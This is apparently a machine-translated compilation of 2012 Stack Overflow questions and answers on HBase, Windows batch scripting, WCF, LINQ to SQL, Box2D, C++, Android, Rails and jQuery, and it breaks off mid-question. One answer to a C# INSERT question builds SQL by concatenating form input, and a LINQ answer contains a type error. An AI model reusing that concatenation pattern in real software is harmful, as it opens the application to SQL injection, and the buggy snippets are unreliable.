#define __GMP_MP_SIZE_T_INT     0
typedef long int        mp_size_t;
typedef long int        mp_exp_t;
#endif 
```

# sql - 从文件中批量插入 HBase

> ID：13328415
> 
> 赞同：0
> 
> 时间：2012-11-11T03:48:35.580
> 
> 标签：sql, database, hadoop, hbase

我正在尝试在表中插入很多行（我的目标是插入十亿个虚拟行）。这就是我所做的：

1.  我将与插入相对应的十亿 SQL 行写入文件。
2.  `./hbase shell < insert.sql`

前几个插入很好，但很快我继续遇到这个错误

```
put 'test', 'row19115', 'cf:a', '19115'

ERROR: java.lang.OutOfMemoryError: unable to create new native thread

Here is some help for this command:
Put a cell 'value' at specified table/row/column and optionally
timestamp coordinates.  To put a cell value into table 't1' at
row 'r1' under column 'c1' marked with the time 'ts1', do:

  hbase> put 't1', 'r1', 'c1', 'value', ts1 
```

*   **如何解决此错误/有更好的方法吗？**
*   **另外，是否有其他方法可以进行插入而不是每次都将它们写入文件？**

# java - 在 Java 中用许多循环重写代码

> ID：13328419
> 
> 赞同：0
> 
> 时间：2012-11-11T03:50:10.087
> 
> 标签：java, loops

有人能告诉我下面的疯狂循环结构是否可以用更好的方式重写吗？现在它做了我想做的一切。

```
 // xi and yi stand for x and y axis input index
    for (int xi = 0; xi < this.inputNumberOfColumnsAlongXAxis; xi++)
    {
        for (int yi = 0; yi < this.inputNumberOfColumnsAlongYAxis; yi++)
        {
            InputCell inputCell = new InputCell(xi, yi);
            Synapse synapse = new Synapse(inputCell);
            // add (inputDataScaleReductionOnXAxis * inputDataScaleReductionOnYAxis)
            // number of synapses to a proximalSegment.
            for (int x = 0; x < this.numberOfColumnsAlongXAxis; x++)
            {
                for (int y = 0; y < this.numberOfColumnsAlongYAxis; y++)
                {
                    int inputX =
                        (int)Math.round(x * inputDataScaleReductionOnXAxis);
                    int inputY =
                        (int)Math.round(y * inputDataScaleReductionOnYAxis);
                    this.columns[(y * this.numberOfColumnsAlongXAxis) + x] =
                        new Column(this, inputX, inputY, x, y);

                    // only add the square of synapses directly under the proximal segment
                    while (xi < this.inputDataScaleReductionOnXAxis * (x + 1))
                    {
                        while (yi < this.inputDataScaleReductionOnYAxis * (y + 1))
                        {
                            this.getColumn(x, y).getProximalSegment().addSynapse(synapse);
                        }
                    }
                 }
             }
         }
     } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:09:22.753

看起来您有一个二维数据结构的单元格和一个`O(N^3)`初始化过程，其中`N`是单元格的数量。这看起来有点贵……但如果 N 非常大或该过程经常完成，这只是一个重要问题。

无论如何，我在代码中看不到任何可以明显简化的东西……假设当前算法反映了要求。看起来这 6 个循环级别是该问题所固有的。有些计算是这样的。

我能看到的唯一可能性是`N`带有连接的突触`O(N^2)`（我认为这就是你正在做的）......在某种程度上是不切实际的。换句话说，只有当我们真正理解您试图使用此代码解决的问题时，我们才能提出重要的改进建议。

* * *

请注意，我并不是说*“通常，如果某些复杂的东西有效，请不要乱用它。”* . 我要说的是：

*   有些事情本质上无法改进......这*看起来像是*这样的事情，并且
*   也许无论如何都无所谓；例如，如果这段代码只执行一次......

*“如果它有效，不要惹它”*是...... IMO......一个在地毯下刷问题而不给他们适当思考的糟糕借口。

And *"Don't bother trying to optimize because usually the extra time and effort produces nothing ..."* is simply another formulation of the same excuse. To me, it says *"I'm so good that my initial code cannot be improved on"* or *"I'm so bad that I cannot ever find decent optimizations"* or *"Too bad ... the customer shouldn't be expecting decent performance anyway"*.

Note that this is significantly different from the standard (and valid) advice which is ... *"Profile before you optimize"*.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:14:28.680

It all depends on the size of your inputs. The growth rate of these nested loops is not good. I.e., as the size of the inputs grows, the time it takes to run you algorithm will grow much faster, exponentially faster. But if you know your inputs will always be small, then it is fine as it is.

# windows - 如何使用 Windows 批处理增加文件夹名称？

> ID：13328421
> 
> 赞同：5
> 
> 时间：2012-11-11T03:50:59.387
> 
> 标签：windows, batch-file

我有一个批处理脚本，它创建一个名为 New_Folder 的文件夹以及其中的一些子目录和文件。目前，如果我需要创建多个 New_Folder，我必须重命名批处理创建的每个 New_Folder，然后才能再次运行它并创建一个新文件夹。我想做的是进行批量检查，看看 New_Folder 是否已经存在，如果存在，将 New_Folder 增加一个数字。所以我会有 New_Folder、New_Folder1、New_Folder2 等等。

我该怎么做呢？我在批处理脚本中看到的增加内容的解决方案似乎不适用于我的情况，除了我为自己的代码复制/粘贴的内容之外，我对批处理脚本一无所知。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-11T06:24:42.460

这是一个始终有效的解决方案，即使数字上存在差距。文件夹编号将始终比当前最大编号大 1。

```
@echo off
setlocal enableDelayedExpansion
set "baseName=New_Folder"
set "n=0"
for /f "delims=" %%F in (
  '2^>nul dir /b /ad "%baseName%*."^|findstr /xri "%baseName%[0-9]*"'
) do (
  set "name=%%F"
  set "name=!name:*%baseName%=!"
  if !name! gtr !n! set "n=!name!"
)
set /a n+=1
md "%baseName%%n%" 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-11T04:52:36.907

这样，您将能够计算“New_Folder *”的出现次数并使用下一个数字创建一个。

```
@echo off
set /a count=0

for /d %%d in (New_Folder*) do (
    set /a count+=1
)

set /a count+=1

mkdir New_Folder%count% 
```

请注意，最好的方法是在 New_Folder 的末尾*找到*最大的数字，但是 Windows Batch 非常有限，而且我是 Linux 人！

编辑：经过大约一小时的谷歌搜索和测试：

```
@echo off

setlocal EnableDelayedExpansion

set max_number=0

for /d %%d in (New_Folder*) do (
    set current_directory=%%~nxd

    call:StrLength name_length !current_directory!
    call:Substring directory_number,!current_directory!,10,!name_length!

    if !directory_number! gtr !max_number! (
        set max_number=!directory_number!
    )
)

set /a max_number+=1

mkdir New_Folder%max_number%

:Substring
::Substring(retVal,string,startIndex,length)
:: extracts the substring from string starting at startIndex for the specified length 
 SET string=%2%
 SET startIndex=%3%
 SET length=%4%

 if "%4" == "0" goto :noLength
 CALL SET _substring=%%string:~%startIndex%,%length%%%
 goto :substringResult
 :noLength
 CALL SET _substring=%%string:~%startIndex%%%
 :substringResult
 set "%~1=%_substring%"
GOTO :EOF

:StrLength
::StrLength(retVal,string)
::returns the length of the string specified in %2 and stores it in %1
set #=%2%
set length=0
:stringLengthLoop
if defined # (set #=%#:~1%&set /A length += 1&goto stringLengthLoop)
::echo the string is %length% characters long!
set "%~1=%length%"
GOTO :EOF 
```

请注意，命令行返回错误“命令的语法不正确”。但一切正常，所以我会让你找到原因......无论目录的顺序如何，或者它们是否从 1 开始，都会创建新文件夹 :) 希望你会喜欢！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-11T05:08:39.693

此解决方案找到编号最大的名称，并为其创建下一个名称：

```
@echo off
for /d %%d in (New_Folder*) do set lastFolder=%%d
set /A nextFolder=%lastFolder:*New_Folder=% + 1
mkdir New_Folder%nextFolder% 
```

***编辑：***以前的解决方案没有正确获得最后一个编号的文件夹，但下一个是正确的：

```
@echo off
setlocal EnableDelayedExpansion
set lastFolder=0
for /d %%d in (New_Folder*) do (
   set folder=%%d
   set folder=!folder:New_Folder=!
   if not defined folder set folder=0
   if !folder! gtr !lastFolder! set lastFolder=!folder!
)
set /A nextFolder=lastFolder+1
mkdir New_folder%nextFolder% 
```

# c# - 如何在 datagridview 或 reportview 的 windows 窗体应用程序中显示来自 wcf 服务的 xml 数据？

> ID：13328427
> 
> 赞同：0
> 
> 时间：2012-11-11T03:53:33.147
> 
> 标签：c#, winforms, wcf, wcf-data-services

我是 wcf 和休息操作的新手，所以任何帮助都会非常感谢您。

如何在 rdlc 或 datagridview 中显示信息？

我的界面使用名为 GetAllCustomer 的方法设置操作合同

```
namespace ConnectionToDatabase
{
    // NOTE: You can use the "Rename" command on the "Refactor" menu to change the interface name "IGetCustomer" in both code and config file together.
    [ServiceContract]
    public interface IGetCustomer
    {
        [OperationContract]
        [WebInvoke(Method = "GET",
            ResponseFormat = WebMessageFormat.Xml,
            BodyStyle = WebMessageBodyStyle.Wrapped,
            UriTemplate = "xml/customers")]        
        List<Customer> GetAllCustomer();
    }
} 
```

我的客户类实现接口类并连接到 sql 数据库并返回客户信息列表

```
public class GetCustomer : IGetCustomer
    {
        public List<Customer> GetAllCustomer()
        {
            List<Customer> mylist = new List<Customer>();

            using (SqlConnection conn = new SqlConnection("Data Source=MATRIX\;Initial Catalog=******;Integrated Security=True"))
            {
                conn.Open();

                string cmdStr = String.Format("select * from CInformation c inner join EmploymentInformation e on c.CID = e.CID");
                SqlCommand cmd = new SqlCommand(cmdStr, conn);
                SqlDataReader rd = cmd.ExecuteReader();

                if (rd.HasRows)
                {
                    while (rd.Read())
                    {
                        mylist.Add(new Customer(rd["LastName"].ToString(), rd["FirstName"].ToString(), rd["MiddleName"].ToString(), rd["EmailAddress"].ToString(), rd["PhoneNumber"]));
                    }
                }
                conn.Close();
            }

            return mylist;
        }
    }

    [DataContract]
    public class Customer
    {
        [DataMember]
        public string lastname { get; set; }
        [DataMember]
        public string firstname { get; set; }
        [DataMember]
        public string middlename { get; set; }
        [DataMember]
        public string emailaddress { get; set; }
        [DataMember]
        public string phonenumber { get; set; }            
        public Customer(string last, string first, string middle, string email, string phone)
        {
            this.lastname = last;
            this.firstname = first;
            this.middlename = middle;
            this.emailaddress = email;
            this.phonenumber = phone;                
        }

    }//end of class 
```

网络配置

```
<?xml version="1.0"?>
<configuration>
  <system.web>
    <compilation debug="true" targetFramework="4.0" />
  </system.web>
  <system.serviceModel>

    <services>
      <service name="ConnectionToDatabase.GetCustomer" behaviorConfiguration="EmpServiceBehaviour">
        <endpoint address ="" binding="webHttpBinding" contract="ConnectionToDatabase.IGetCustomer" behaviorConfiguration="web">
        </endpoint>
      </service>
    </services>

    <behaviors>
      <serviceBehaviors>
        <behavior name="EmpServiceBehaviour">
          <serviceMetadata httpGetEnabled="true"/>
          <serviceDebug includeExceptionDetailInFaults="false"/>
        </behavior>
      </serviceBehaviors>
      <endpointBehaviors>
        <behavior name="web">
          <webHttp/>
        </behavior>
      </endpointBehaviors>
    </behaviors>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
  </system.serviceModel>
  <system.webServer>
    <modules runAllManagedModulesForAllRequests="true"/>
  </system.webServer>

</configuration> 
```

窗体应用程序

```
public Form1()
{
    InitializeComponent();
}

private void btnGetAllCustomers_Click(object sender, EventArgs e)
{
 WebRequest request = WebRequest.Create("http://localhost:52420/GetCustomer.svc/xml/customers");
        WebResponse ws = request.GetResponse();

        StreamReader responseStream = new StreamReader(ws.GetResponseStream());
        string response = responseStream.ReadLine();
        responseStream.Close();   
        textBox1.AppendText(response);
} 
```

现在看起来像这样

在文本框中

```
<GetAllCustomerResponse xmlns="http://tempuri.org/"><GetAllCustomerResult xmlns:a="http://schemas.datacontract.org/2004/07/ConnectionToDatabase" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><a:Customer><a:firstname>Dog</a:firstname><a:lastname>Cat</a:lastname><a:middlename>up</a:middlename></a:Customer></GetAllCustomerResult></GetAllCustomerResponse> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:32:26.517

你需要喜欢这个

```
 using (nServiceReferenceCustomers.GetCustomerClient svc = new ServiceReferenceCustomers.GetCustomerClient())
    {
        XmlNode node = svc.GetAllCustomer();
        DataSet ds = new DataSet();
        using (XmlNodeReader reader = new XmlNodeReader(node))
        {
            ds.ReadXml(reader);
        }

        DataTable table = ds.Tables["Table"];
        DataRow row = table.Rows[0];
        string Lastname= (string) row["lastname"];
        string Firstname= (string) row["firstname"];
        string Middlename= (string) row["middlename "];
string email= (string) row["emailaddress"];
string Phone= (string) row["phonenumber"];
    } 
```

# php - 我可以选择表格的行并检索我正在选择的表格的名称吗？

> ID：13328429
> 
> 赞同：0
> 
> 时间：2012-11-11T03:54:37.977
> 
> 标签：php, mysql, sql

我有一个名为的表`page`，我查询这个，例如，

```
SELECT *
FROM page 
```

我像这样访问此表列中每一行的数据`$item->title;`

我想知道我是否可以选择该表的行，同时我可以检索我选择的该表的名称是什么？所以当我这样做时，

`echo $item->table_name;`然后我得到了这个**页面**

可能吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T03:57:18.177

当然，您可以执行以下操作：

```
SELECT *, 'page' AS table_name FROM page; 
```

不过，询问您从哪个表获得了一行并没有多大意义。如果您执行了联接，您期望结果是什么？选择不同表的两个查询的联合呢？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:04:51.513

实际上，似乎有一个 PHP[函数](http://php.net/manual/en/function.mysql-tablename.php)可以为您提供查询的表名。我从来没有使用过它，所以不确定它在连接或任何东西中如何工作，但它目前似乎可以满足您的需求。

# c# - LinqToSQL - 对象的有效处理 - 检索第一个/单个 iobject

> ID：13328431
> 
> 赞同：2
> 
> 时间：2012-11-11T03:54:50.703
> 
> 标签：c#, database, linq, linq-to-sql

过去几周我一直在工作`LinqToSql`，我喜欢它，这里的社区很棒。

我创建了一个查询来在数据库中查找一个对象并更新值，它似乎工作正常，但代码对我来说看起来并不自然，我想有一个更好的解决方案。

请查看下面的代码；

```
 //Return a list of MyObject items
        // irrelevant line, just to show what the objects are
        List<MyObject> items  = Factory.GetObjects(); 

        foreach (var item in items)
        {
            var myObjects= from myobj in db.MyOjects
                             where myobj.id == item.Key
                             select myobj;

            //Should ONLY find 1 object 
            //Below is the code I think we could optimize
            if (myObjects.Count() == 1)
            {
                myObjects.First().propertyToChange1 = item.p1;
                myObjects.First().propertyToChange2 = item.p2;
                myObjects.First().dateAltered = DateTime.Now;

                //Update DB
                db.SubmitChanges();
            }

        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T03:59:36.500

更好的解决方案是使用`SingleOrDefault`，如下所示：

```
var myObject = db.MyOjects.SingleOrDefault(myobj => myobj.id == item.Key);
if (myObject != null) {
    myObject.propertyToChange1 = item.p1;
    myObject.propertyToChange2 = item.p2;
    myObject.dateAltered = DateTime.Now;
    //Update DB
    db.SubmitChanges();
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T04:02:14.380

您也可以通过常规查询方式使用 first 或 default 来处理它

```
var myObjects= (from myobj in db.MyOjects
                             where myobj.id == item.Key
                             select myobj).FirstOrDefault();
          if (myObjects != null)
            {
                myObjects.First().propertyToChange1 = item.p1;
                myObjects.First().propertyToChange2 = item.p2;
                myObjects.First().dateAltered = DateTime.Now;

                //Update DB
                db.SubmitChanges();
            } 
```

# actionscript-3 - Box2d 动态圆体穿过我的静态多边形体？

> ID：13328435
> 
> 赞同：1
> 
> 时间：2012-11-11T03:55:40.530
> 
> 标签：actionscript-3, flash, box2d

我使用 b2PolygonShape.SetAsArray 函数创建了带有 box2d 的“倾斜墙”，并且我的播放器对象（动态 b2CircleShape）能够推入并最终穿过它。但是，当我使用 SetAsBox 时，它将不再通过它。有人知道为什么会这样吗？

我正在使用的数组：

```
// array
var vertices:Array = [];
vertices[0] = new b2Vec2(0, 0);
vertices[1] = new b2Vec2(0, 506);
vertices[2] = new b2Vec2(50, 506);
vertices[3] = new b2Vec2(100, 0); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T06:37:26.810

您需要颠倒这些顶点的顺序，以使多边形逆时针“缠绕”。

# c# - INSERT 语句的问题（我认为）

> ID：13328436
> 
> 赞同：2
> 
> 时间：2012-11-11T03:55:46.413
> 
> 标签：c#, sql-server, wpf, datetime, sqldatatypes

我正在为我的老板在工作中使用报价管理器，但我遇到了一些问题。这是一个 WPF C# 应用程序，它是我第一次构建任何与 SQL Server 数据库一起工作的东西。我目前遇到三个问题。

背景：

当用户打开应用程序时，他们会看到一个 DataGrid、一个新的报价按钮和几个我尚未创建的其他控件。当他们按下新报价按钮时，会弹出一个新窗口，其中包含一个包含客户姓名、数量等文本框的表单。该表单的底部是一个提交按钮，此时窗口将关闭，然后他们添加的信息将作为新行插入到 DataGrid 中。

问题一：

我数据库中的一个字段称为 Open_Quote，它应该是我们收到订单的日期。这是以编程方式处理的，这是我的第一个问题涉及的内容。我将在这篇文章的底部包含所有代码，但是当用户点击提交时，我收到以下错误：“从字符串转换日期和/或时间时转换失败。”

问题二：

为了测试我的其余代码并稍后返回以解决日期问题，我注释掉了该代码并尝试再次运行我的程序。这次我得到一个不同的错误：“'newQuote.Qty'周围的语法不正确。”

问题三：

再次，为了最终测试我的其余代码而注释掉该代码，我收到了第三个错误：“字符串或二进制数据将被截断。此过程已终止。”

我希望有一段代码导致所有这三个问题，但我可能完全不在那儿。我已经拉了一天多的头发试图弄清楚这一点。无论如何，这是代码：

newQuote.xaml.cs：

```
 private void SubmitQuotebtn_Click(object sender, RoutedEventArgs e)
    {
        CustomerData newQuote = new CustomerData();

        int quantity;
        quantity = Convert.ToInt32(Qtytxt.Text);

        string theDate = System.DateTime.Today.Date.ToString("d");

        newQuote.OpenQuote = theDate;
        newQuote.CustomerName = CustNametxt.Text;
        newQuote.OEMName = OemNametxt.Text;
        newQuote.Qty = quantity;
        newQuote.QuoteNumber = QuoteNumtxt.Text;
        newQuote.FdNumber = FabDrawingNumtxt.Text;
        newQuote.RfqNumber = RfqNumtxt.Text;
        newQuote.RevNumber = RevNumtxt.Text;

        try
        {
            string insertConString = Sqtm.Properties.Settings.Default.SqtmDbConnectionString;

            using (SqlConnection insertConnection = new SqlConnection(insertConString))
            {
                insertConnection.Open();

                SqlCommand cmd = new SqlCommand("INSERT INTO General_Info(Open_Quote, Customer_Name, OEM_Name, Qty, Quote_Num, Fab_Drawing_Num, "
                                                + "Rfq_Num, Rev_Num) values('newQuote.OpenQuote', 'newQuote.CustomerName', 'newQuote.OemName', 'newQuote.Qty' "
                                                + "'newQuote.QuoteNumber', 'newQuote.FdNumber', 'newQuote.RfqNumber', 'newQuote.RevNumber')", insertConnection);

                cmd.ExecuteNonQuery();

            }
        }

        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }

    } 
```

客户数据.cs：

```
 class CustomerData
{
    private string _CustomerName;
    private string _OEMName;
    private string _OpenQuote;
    private int _Qty;
    private string _QuoteNumber;
    private string _FdNumber;
    private string _RfqNumber;
    private string _RevNumber;

    public CustomerData()
    {
        // empty constructor
    }

    public string CustomerName
    {
        get { return _CustomerName; }
        set { _CustomerName = value; }
    }

    public string OpenQuote
    {
        get { return _OpenQuote; }
        set { _OpenQuote = value; }
    }

    public string OEMName
    {
        get { return _OEMName; }
        set { _OEMName = value; }
    }

    public int Qty
    {
        get { return _Qty; }
        set { _Qty = value; }
    }

    public string QuoteNumber
    {
        get { return _QuoteNumber; }
        set { _QuoteNumber = value; }
    }

    public string FdNumber
    {
        get { return _FdNumber; }
        set { _FdNumber = value; }
    }

    public string RfqNumber
    {
        get { return _RfqNumber; }
        set { _RfqNumber = value; }
    }

    public string RevNumber
    {
        get { return _RevNumber; }
        set { _RevNumber = value; }
    }
} 
```

作为参考，以下是我在 SQLServer 中设置此表的方式：

```
Open_Quote, date, not null
Customer_Name, varchar(25), not null
OEM_Name, varchar(25), null
Qty, int, not null
Qute_Num, varchar(20), null
Fab_Drawing_Num, varchar(20), not null
Rfq_Num, varchar(10), null
Rev_Num, varchar(10), null 
```

提前感谢任何帮助我的人，

*   安德鲁

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:16:21.500

用参数再试一次，让我们知道它是怎么回事。 [http://www.dotnetperls.com/sqlparameter](http://www.dotnetperls.com/sqlparameter)

编辑：或者 Tieson T. 所说的。多参与一点就更好了。

要让数据显示在数据网格中，插入后，您可以重新绑定网格。确保您更新数据源，以便它重新提取您刚刚插入的数据。如果您有问题，请显示您在何处/如何设置网格的数据源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T04:31:29.887

尝试这个：

```
SqlCommand cmd = new SqlCommand("INSERT INTO General_Info(Open_Quote, Customer_Name, OEM_Name, Qty, Quote_Num, Fab_Drawing_Num, "
                                            + "Rfq_Num, Rev_Num) values('" + newQuote.OpenQuote + "','" + newQuote.CustomerName + "','" + newQuote.OemName + "','" + newQuote.Qty + "','" + newQuote.QuoteNumber + "','" + newQuote.FdNumber + "', '" + newQuote.RfqNumber + "','" + newQuote.RevNumber + "' "
                                            + " )", insertConnection); 
```

# c++ - 二叉搜索树例程无法使用指针参数编译

> ID：13328447
> 
> 赞同：-1
> 
> 时间：2012-11-11T03:59:11.307
> 
> 标签：c++, pointers

对 C++ 来说很新，我正在尝试为几天后到期的项目编写二进制堆计算器。在进入二叉堆之前，我想编写一个二叉树结构作为堆的超类。

我仍在尝试围绕指针与引用以及每个指针在分配时的样子以及何时应该将某些东西定义为指针或引用。

无论如何，这里有一些我很好奇的代码：

```
#include "BinaryTree.h"

int main(void){

    BinaryTree tempTree = new BinaryTree();
    BinaryNode* ptrToRoot;
    ptrToRoot = tempTree.getRootNode();

    int inputArr = { 5, 2, 7, 10, 11, 20, 1};

    for(int i = 0; i < sizeof(inputArr) / sizeof(inputArr[0]); i++){
            tempTree.binaryTreeInsert(ptrToRoot, inputArr[i]);
    }

    tempTree.inOrderPrint(ptrToRoot);
} 
```

而且我从对 binaryTreeInsert 和 inOrderPrint 的调用中都收到了错误，它们都将 ptrToRoot 作为参数。错误说“无效的参数......有效的候选人是 BinaryNode *, int。

但是当我将鼠标悬停在 Eclipse 中的每个参数上时，它们都显示它们是必需的类型。

我是否错误地定义了指针？这是我的 BinaryTree 类的头文件，以防万一：

```
#ifndef BINARYTREE_H_
#define BINARYTREE_H_

#include "BinaryNode.h"

struct BinaryTree  {

    BinaryTree();
    virtual ~BinaryTree(){}

    BinaryNode rootNode;
    int noOfNodes;

    BinaryNode* getRootNode(){ return rootNode; }

    int countNodes(BinaryNode* ptRootNode);
    bool binaryTreeContains( BinaryNode* ptRootNode, int element);
    void binaryTreeInsert(BinaryNode* ptRootNode, int element);
    void preorderPrint( BinaryNode *ptRootNode );
    void postorderPrint( BinaryNode *ptRootNode );
    void inorderPrint( BinaryNode *ptRootNode );
};

#endif 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T04:02:09.997

这可能至少是您问题的一部分：

```
BinaryTree tempTree = new BinaryTree(); 
```

此行不正确；`new`用于执行堆分配，它返回一个指向新分配对象的指针。但是，您的对象是在堆栈上分配的。

尝试将其更改为：

```
BinaryTree tempTree; 
```

这将使用无参数构造函数在堆栈上构造一个新对象。这可能会解决您的问题，因为编译器可能会对此变量的类型感到困惑。

# android - Android-Universal-Image-Loader :: 在 GridView 上加载图像

> ID：13328448
> 
> 赞同：2
> 
> 时间：2012-11-11T03:59:30.890
> 
> 标签：android, universal-image-loader

我正在尝试开发墙纸应用程序。当应用程序启动时，活动会在 gridView 上显示类别（文本视图上的图像和相应名称）。当我选择一个类别时，它会导航到一个子类别。在子类别活动中，它还在 textVew 上显示具有相应名称的子类别图像。问题在于子类别活动图像未加载。有时它会加载图像；当我按下后退按钮，然后再次选择该子类别时，它会加载三种模式图像；按下后退按钮并选择子类别会导致加载另外三个图像（现在总共 10 个图像）。图像已正确缓存在磁盘上。这是我的配置：

```
 cacheDir = new File(Environment.getExternalStorageDirectory(),
                    "peakwallpapers/cache"); // --
            // Create configuration for ImageLoader
            config = new ImageLoaderConfiguration.Builder(this).enableLogging()
                    .discCache(new UnlimitedDiscCache(cacheDir))
                    .memoryCache(new UsingFreqLimitedMemoryCache(2000000))
                    .denyCacheImageMultipleSizesInMemory().threadPoolSize(10)
                    .threadPriority(Thread.MIN_PRIORITY + 2)
                    .defaultDisplayImageOptions(DisplayImageOptions.createSimple())
                    .build(); // --

            options = new DisplayImageOptions.Builder()
                    .showStubImage(R.drawable.stub_image)
                    .showImageForEmptyUri(R.drawable.image_for_empty_url)
                    .cacheInMemory().cacheOnDisc().build();
            imageLoader.init(config); 
```

这是 getView() 方法：

```
 @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            final View rowView;
            final ViewHolder viewHolder = new ViewHolder();
            if (convertView == null) {
                rowView = getLayoutInflater().inflate(
                        R.layout.item_sub_category_grid, null);

                viewHolder.imageView = (ImageView) rowView
                        .findViewById(R.id.image_item_sub_category);
                viewHolder.textView = (TextView) rowView
                        .findViewById(R.id.text_item_sub_cat_desc);

                rowView.setTag(viewHolder);

            } else {
                rowView = (View) convertView;
            }

            ViewHolder holder = (ViewHolder) rowView.getTag();
            holder.textView.setText(wpSubCategories.get(position)
                    .getSubCategoryName());

            imageLoader.displayImage(imageUrls[position], viewHolder.imageView,
                    options, new SimpleImageLoadingListener() {
                @Override
                public void onLoadingStarted() {
                    showLoading();
                }
                        @Override
                        public void onLoadingComplete(Bitmap loadedImage) {
                            Animation anim = AnimationUtils.loadAnimation(
                                    SubCategoryGridActivity.this,
                                    R.anim.fade_in);
                            viewHolder.imageView.setAnimation(anim);
                            anim.start();
                        }
                    });

            return rowView;
        }
    } 
```

我的网格布局： sub_category_grid.xml ：

```
<?xml version="1.0" encoding="utf-8"?>
<GridView xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/gridview_sub_category"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:gravity="center"
    android:horizontalSpacing="4dip"
    android:numColumns="2"
    android:verticalSpacing="4dip" /> 
```

和我的网格项目：item_sub_category_grid.xml：

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/frame_l_item_sub_category_item"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight=".5"
    android:background="@drawable/textlines" >

    <ImageView
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@+id/image_item_sub_category"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:adjustViewBounds="true"
        android:contentDescription="@string/descr_image"
        android:scaleType="centerCrop" />

    <TextView
        android:id="@+id/text_item_sub_cat_desc"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_gravity="bottom"
        android:background="@drawable/cat_bg"
        android:gravity="center_horizontal"
        android:text="TextView"
        android:textColorHighlight="#656565"
        android:typeface="monospace" >
    </TextView>

</FrameLayout> 
```

注意：它在 LogCat 上没有显示错误。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-11T08:39:46.967

首先，我认为您的线程池大小太大。当然，这取决于您的应用所针对的设备。但它在非现代设备上运行速度会非常慢。我认为5就足够了，但是您应该自己测试一下。改变线程池大小和线程优先级以实现最佳速度和性能。

第二：你的`getView()`方法有逻辑错误。继续前进 `final ViewHolder viewHolder = new ViewHolder();` ， `if (convertView == null) {` 您会发现问题所在。您的 vars`viewHolder`和`holder`逻辑上相互重叠。

**UPD：**`onStop()`如果您这样做，请不要在活动中调用 ImageLoader.stop() 。

# ruby-on-rails - Rails：Index文件中PostController方法的正确使用方法

> ID：13328453
> 
> 赞同：2
> 
> 时间：2012-11-11T04:00:41.587
> 
> 标签：ruby-on-rails, post

我想了解如何在索引页面中使用控制器中定义的方法。我正在尝试在我的博客上实现“喜欢”按钮。

**后控制器**

```
def like
@post = Post.find(params[:id])
@post.like += 1
@post.save
end 
```

在列出所有帖子的索引中，我尝试了类似的方法。

```
<% @posts.each do |post| %>
 <tr>
  <td><%= post.name %></td>
  <td><%= post.created_at.strftime("%Y/%m/%d, %I:%M%p") %></td>
  <td><%= post.view %></td>
  <td><%= link_to 'like', like_post_path %></td>
  <td>hate</td>
</tr>
<% end %> 
```

我通过查看代码得到了这个想法，

```
<%= link_to 'make a new post', new_post_path %>
<%= link_to 'Edit', edit_post_path(post) %> 
```

我认为在索引页面中使用控制器中的方法的方式是
**(postController 中的方法)_post_path**，但似乎我弄错了。

```
undefined local variable or method `like_post_path' 
```

我也试过喜欢（帖子）。

我的最终目标是让这个函数成为一个 ajax 函数，所以我希望它是一个像

```
<% link_to_function 'like', like_post, remote: true %> 
```

**在这种情况下，使用“like”方法的正确方法是什么？**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T04:15:50.703

您需要定义一个命名路由才能完成这项工作。像：

```
# in config/routes.rb
resources :posts do
  member do
    get 'like'
  end

  # OR
  get 'like', :on => :member
end

# in `rake routes` this would show up as:
like_post GET    /posts/:id/like(.:format)  posts#like

# you'd reference in a view like:
like_post_path(@post) 
```

# jquery - 为以下 jQuery 动画添加缓动？

> ID：13328454
> 
> 赞同：0
> 
> 时间：2012-11-11T04:00:42.587
> 
> 标签：jquery, jquery-animate, easing

我正在为元素的高度设置动画：

```
 // Animate height of items
  $j(".item .row").toggle(function(){
    $j(this).animate({height:500},200);
  },function(){
    $j(this).animate({height:300},200);
  }); 
```

我想知道如何添加缓动？（例如动画接近尾声变慢了？）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T04:09:05.027

定义缓动，如下方式

```
$('selector').animate({
    prop:1
},{
    easing: easing, //Something like 'linear'
    duration: duration,
    complete: callback
}); 
```

您还可以通过包含[Easing Plugin](http://gsgd.co.uk/sandbox/jquery/easing/)添加其他缓动效果。

在你的情况下，它会像

```
$j(".item .row").toggle(function(){
    $j(this).animate({height:500}, {
        easing: 'linear',
        duration: '200'
    });
  },function(){
    $j(this).animate({height:300},{
        easing: 'linear',
        duration: '200'
    });
}); 
```

# file-upload - 使用 Java 将文件上传到 Alfresco 时出错，CmisConstraintException:Conflict

> ID：13328456
> 
> 赞同：2
> 
> 时间：2012-11-11T04:00:58.210
> 
> 标签：file-upload, alfresco, opencmis

使用 Java 将文件上传到存储库时出错。我正在使用 Alfresco 4.0e。我能够从我的应用程序连接到位于 Unix 服务器上的存储库，该应用程序是用 struts 开发的，从 localhost。

我正在使用 OpenCMIS 进行连接和上传。当我尝试上传文档时，执行后会出错`createDocument(...)`

```
